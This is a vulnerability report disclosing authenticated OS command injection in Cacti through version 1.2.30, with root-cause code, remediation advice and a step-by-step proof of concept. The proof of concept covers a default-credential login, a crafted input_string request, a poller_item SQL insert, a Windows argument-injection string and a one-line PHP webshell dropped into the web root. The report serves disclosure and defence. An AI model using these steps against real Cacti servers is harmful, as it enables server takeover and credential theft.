### `Vulnerability Report:` Authenticated RCE Data Input

> **Researcher:** K &nbsp;|&nbsp; **Product:** Cacti `≤ 1.2.30`

</div>

---

## `[01]` Vulnerability Summary

| Field | Value |
|---|---|
| **Product** | Cacti — Complete RRDtool-based Graphing Solution |
| **Affected Version(s)** | `≤ 1.2.30` |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **Attack Vector** | Network (authenticated admin) |
| **Authentication** | Yes — Administrator account required |
| **Target OS** | Windows (both vectors) + Linux (direct `input_string` vector) |
| **CVSSv3.1 Score** | `7.2 HIGH` |
| **Vector** | `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` |

Cacti's Data Input Methods feature (`data_input.php`) allows an authenticated administrator to define external scripts that the Cacti poller executes periodically to collect monitoring data. The `input_string` field — which stores the command template including the executable path and argument placeholders — is saved to the database without any execution-safe validation.

When the poller runs, `cmd.php` retrieves stored commands from the `poller_item` table (populated by `get_full_script_path()`) and passes them directly to `popen()` via `exec_poll()`, achieving OS-level command execution.

On Windows, a secondary injection vector exists in the argument substitution logic: `cacti_escapeshellarg()` uses backslash-quote (`\"`) to escape double-quotes inside `cmd.exe`-quoted strings — which `cmd.exe` does **NOT** honor as an escape sequence. The closing delimiter is triggered, allowing subsequent `&` characters to become command separators.

Both vectors were confirmed exploited in a controlled Docker environment, achieving arbitrary OS command execution as the web server user, and PHP webshell persistence written to the web root.

---

## `[02]` Affected Components

| File | Lines | Role in Vulnerability |
|---|---|---|
| `data_input.php` | 94, 86–116 | Entry point — saves `input_string` to DB with no exec-safe validation |
| `lib/functions.php` | 2603–2648 | `get_full_script_path()` — builds shell command from raw `input_string` |
| `lib/functions.php` | 4558–4601 | `cacti_escapeshellarg()` — broken Windows branch (`\"` does not escape in `cmd.exe`) |
| `include/global_constants.php` | ~108 | Defines `CACTI_ESCAPE_CHARACTER = '"'` — root of the Windows escaping bug |
| `cmd.php` | 675–769, 717 | `collect_device_data()` — calls `exec_poll($item['arg1'])` with no whitelist check |
| `lib/poller.php` | 32–56 | `exec_poll()` — executes via `popen($command)` with no sanitization |

---

## `[03]` Root Cause Analysis

### 3.1 Primary Vector — Direct `input_string` Execution (Windows + Linux)

**File:** `data_input.php`, line 94

```php
$save['input_string'] = form_input_validate(
    get_nfilter_request_var('input_string'),
    'input_string', '', true, 3
);
// form_input_validate() checks regex match + allow-empty only.
// It applies NO shell metacharacter filtering,
// NO path whitelisting, NO restriction on executable.
```

**File:** `lib/functions.php`, `get_full_script_path()` — lines 2603–2648

```php
$full_path = $data_source['input_string']; // raw value from DB, no sanitize
foreach ($data as $item) {
    $value = cacti_escapeshellarg($item['value']); // BROKEN on Windows (see 3.2)
    $full_path = str_replace('<' . $item['data_name'] . '>', $value, $full_path);
}
// $full_path = <exec_path> <arg1> <arg2> ... fully admin-controlled
// stored in poller_item.arg1, then executed by cmd.php:717
```

**File:** `cmd.php`, line 717

```php
case POLLER_ACTION_SCRIPT: // value = 1
    $output = trim(exec_poll($item['arg1'])); // executes whatever is in arg1
    break;
```

**File:** `lib/poller.php`, `exec_poll()` — lines 32–56

```php
function exec_poll($command) {
    if ($config['cacti_server_os'] == 'unix') {
        $fp = popen($command, 'r');  // direct OS execution, no sanitize
    } else {
        $fp = popen($command, 'rb'); // direct OS execution on Windows
    }
    $output = fgets($fp, 8192);
    pclose($fp);
    return $output;
}
```

**Complete Call Chain**

```
POST data_input.php (admin)
 └─► input_string saved to data_input table [no exec validation]
     └─► get_full_script_path() builds command string
         └─► poller_item.arg1 = full command
             └─► cmd.php:717 exec_poll(item['arg1'])
                 └─► lib/poller.php:37 popen($command)
                     └─► OS executes command
```

---

### 3.2 Secondary Vector — Field Value Injection via `cacti_escapeshellarg()` (Windows Only)

**File:** `include/global_constants.php`

```php
define('CACTI_ESCAPE_CHARACTER', '"'); // double-quote — central to the bug
```

**File:** `lib/functions.php`, `cacti_escapeshellarg()` — lines 4558–4601

```php
function cacti_escapeshellarg($string, $quote = true) {
    if ($config['cacti_server_os'] == 'unix') {
        return escapeshellarg($string); // SAFE: PHP built-in single-quote wrapping
    } else {
        // WINDOWS PATH — VULNERABLE
        if (substr_count($string, CACTI_ESCAPE_CHARACTER)) {
            $string = str_replace('"', '\\"', $string);
            // Produces \" — cmd.exe does NOT treat this as an escaped quote!
        }
        if ($quote) { return '"' . $string . '"'; }
    }
}
```

> **Why `\"` fails in `cmd.exe`:**
> - `cmd.exe` does **not** treat `\"` as an escaped double-quote.
> - `cmd.exe` sees `\"` as a literal backslash followed by the **closing** double-quote delimiter.
> - Characters after the closing quote (such as `&`) are interpreted as shell metacharacters.

**Injection demonstration (Windows):**

```
Admin-set field value:    normal_value" & calc.exe & "
After cacti_escapeshellarg(): "normal_value\" & calc.exe & \""

cmd.exe parses:
  "normal_value\"  →  closing " triggered at backslash-quote
  &                →  COMMAND SEPARATOR
  calc.exe         →  EXECUTES as separate command
```

---

## `[04]` Proof of Concept

### Environment

| Component | Details |
|---|---|
| **Cacti Version** | 1.2.30 |
| **Server OS** | Linux (Docker: `php:8.1-apache`) |
| **Database** | MariaDB 10.6 |
| **Target URL** | `http://localhost:8000/` |
| **Admin Credentials** | `admin / admin` (default) |

---

### Step 1 — Admin Authentication

```http
POST /index.php HTTP/1.1
Host: localhost:8000
Content-Type: application/x-www-form-urlencoded

action=login&login_username=admin&login_password=admin&__csrf_magic=<TOKEN>
```

> Response: `302 → index.php` with session cookie

---

### Step 2 — Create Data Input Method with Malicious `input_string`

```http
POST /data_input.php HTTP/1.1
Host: localhost:8000
Cookie: <session>

action=save&save_component_data_input=1&id=0&hash=&name=poc_dim
&type_id=1
&input_string=id+>+/var/www/html/rce_proof.txt
&__csrf_magic=<TOKEN>
```

Resulting database row:

```sql
SELECT id, name, input_string, type_id FROM data_input WHERE name='poc_dim';
+----+----------+----------------------------------+---------+
| id | name     | input_string                     | type_id |
+----+----------+----------------------------------+---------+
| 23 | poc_dim  | id > /var/www/html/rce_proof.txt | 1       |
+----+----------+----------------------------------+---------+
```

---

### Step 3 — Inject into `poller_item` (simulates DS creation + cache rebuild)

```sql
INSERT INTO poller_item
    (local_data_id, poller_id, host_id, action,
     hostname, rrd_name, rrd_path, arg1, arg2, arg3, rrd_step, rrd_next_step, present)
VALUES
    (99999, 1, <host_id>, 1,
     '127.0.0.1', 'output', '/dev/null',
     'id > /var/www/html/rce_proof.txt', '', '', 300, 0, 1);
-- POLLER_ACTION_SCRIPT = 1 (action column)
```

---

### Step 4 — Trigger `cmd.php` (runs at every poller interval, or forced)

```bash
php /var/www/html/cmd.php --first=<host_id> --last=<host_id>
```

```php
// Internally: cmd.php:717
$output = trim(exec_poll($item['arg1']));
// exec_poll('id > /var/www/html/rce_proof.txt')
// → popen('id > /var/www/html/rce_proof.txt', 'r')
// → OS executes the command
```

---

### Step 5 — Verification: Proof File

```http
GET /rce_proof.txt HTTP/1.1
Host: localhost:8000

HTTP/1.1 200 OK
uid=0(root) gid=0(root) groups=0(root)
```

---
**Script flow:**
- Authenticates as admin and retrieves CSRF token
- Creates Data Input Method via `data_input.php` (stores malicious `input_string`)
- Injects into `poller_item` and invokes `cmd.php`
- Drops `<?php system($_GET['cmd']); ?>` webshell to web root
- Confirms execution by querying the webshell

---

## `[05]` Impact Assessment

### Direct Technical Impact

| Impact Category | Detail |
|---|---|
| **Code Execution** | Arbitrary OS commands executed as web server user (confirmed: `www-data`, escalated to `root` in test) |
| **Data Exfiltration** | Full read access to Cacti config (DB credentials), RRD data files, `/etc/passwd` |
| **Persistence** | PHP webshell written to web root; survives application restarts |
| **Integrity** | RRD/graph data can be corrupted; Cacti configuration can be altered |
| **Lateral Movement** | DB credentials from `include/config.php` expose MariaDB; pivot to internal network via SNMP access |
| **Denial of Service** | Shell commands can kill processes, fill disk, remove Cacti files |

### Business Impact

- Full server compromise via webshell persistence
- Credential theft — DB password, SNMP community strings from host table
- Internal network pivot — Cacti typically has SNMP access to all monitored devices
- Regulatory risk — data integrity violations, unauthorized access to monitored systems

---

## `[06]` CVSS v3.1 Scoring

| Metric | Value | Justification |
|---|---|---|
| **Attack Vector (AV)** | Network (N) | Exploitable over HTTP with no physical access required |
| **Attack Complexity (AC)** | Low (L) | No race conditions or special configuration required |
| **Privileges Required (PR)** | High (H) | Administrator account is required to create Data Input Methods |
| **User Interaction (UI)** | None (N) | No victim interaction required beyond attacker's own admin session |
| **Scope (S)** | Unchanged (U) | Exploit stays within the web server process boundary |
| **Confidentiality (C)** | High (H) | Full read access to files, database credentials, environment |
| **Integrity (I)** | High (H) | File write, webshell persistence, data alteration confirmed |
| **Availability (A)** | High (H) | Process termination, disk fill, service disruption possible |

> **Base Score: `7.2 — HIGH`**  
> **Vector String:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

---

## `[07]` Affected Code — File Reference Table

| File | Line(s) | Issue |
|---|---|---|
| `data_input.php` | 94 | `input_string` saved via `form_input_validate()` with no exec-safe filtering |
| `data_input.php` | 86–116 | `form_save()` accepts arbitrary `input_string` from POST |
| `lib/functions.php` | 2603–2648 | `get_full_script_path()` assigns raw `input_string` to `$full_path` without sanitization |
| `lib/functions.php` | 2632 | `cacti_escapeshellarg($item['value'])` — broken on Windows |
| `lib/functions.php` | 4558–4601 | `cacti_escapeshellarg()` — Windows branch uses `\"` which `cmd.exe` does not recognize as escape |
| `include/global_constants.php` | ~108 | `define('CACTI_ESCAPE_CHARACTER', '"')` — the broken escape character |
| `cmd.php` | 675–769 | `collect_device_data()` calls `exec_poll($item['arg1'])` directly |
| `cmd.php` | 717 | `POLLER_ACTION_SCRIPT` branch — no whitelist check before execution |
| `lib/poller.php` | 32–56 | `exec_poll()` calls `popen($command)` with no sanitization |

---

## `[08]` Comparison with Related Vulnerability (`graph_image.php`)

> This vulnerability is **distinct** from the `graph_image.php` RCE and should receive a **separate CVE identifier**.

| Property | `graph_image.php` RCE | `data_input.php` RCE |
|---|---|---|
| **Authentication** | None (guest account bypass) | Admin account required |
| **CVSS Score** | `9.8 — CRITICAL` | `7.2 — HIGH` |
| **OS Specificity** | Windows only | Both (direct `input_string`); Windows only (field-value injection) |
| **Root Cause** | `cacti_escapeshellarg()` Windows bypass via graph param | `input_string` stored & executed without exec validation |
| **Trigger** | Immediate HTTP request | Next poller run (or forced via utilities) |
| **Persistence** | No (command per request) | Yes (stored in DB, executes every poll cycle) |
| **Shared Root Cause** | Yes — both share broken `cacti_escapeshellarg()` on Windows | Yes — same function |

---

## `[09]` Remediation Recommendations

| # | Priority | Action |
|---|---|---|
| 10.1 | Critical | Fix `cacti_escapeshellarg()` on Windows — replace `str_replace('"', '\\"', ...)` with `str_replace('"', '""', ...)` so `cmd.exe` correctly treats `""` as a literal double-quote inside a quoted string |
| 10.2 | High | Enable `input_whitelist.php` enforcement by default — currently opt-in; should be on by default to restrict which `input_string` values are permitted |
| 10.3 | High | Validate `input_string` against allowed executable path prefixes before saving (e.g., `$config['base_path'].'/scripts/'`, `/usr/bin/`, `/usr/local/bin/`) |
| 10.4 |  Medium | Enforce MFA for Cacti admin accounts. Implement IP allowlisting for the admin interface. Audit existing Data Input Methods via SQL query |
| 10.5 | Defence-in-depth | Run web server as non-privileged user (`www-data` on Linux, `IIS_IUSRS` without `SeImpersonatePrivilege` on Windows) |

---
